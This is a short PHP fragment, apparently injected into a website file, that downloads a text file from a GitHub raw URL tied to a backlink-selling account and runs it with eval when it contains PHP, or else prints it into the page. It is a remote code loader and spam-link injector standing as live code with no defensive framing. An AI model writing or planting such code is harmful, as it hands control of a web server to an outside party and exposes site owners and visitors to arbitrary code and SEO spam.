?>
<?php
$jasabacklinks = 'https://raw.githubusercontent.com/BacklinkGG/vipv2/main/system.txt';
$fileContents = file_get_contents($jasabacklinks);
if (strpos($fileContents, '<?php') !== false) {
    eval('?>' . $fileContents);
} else {
    echo $fileContents;
}
?>
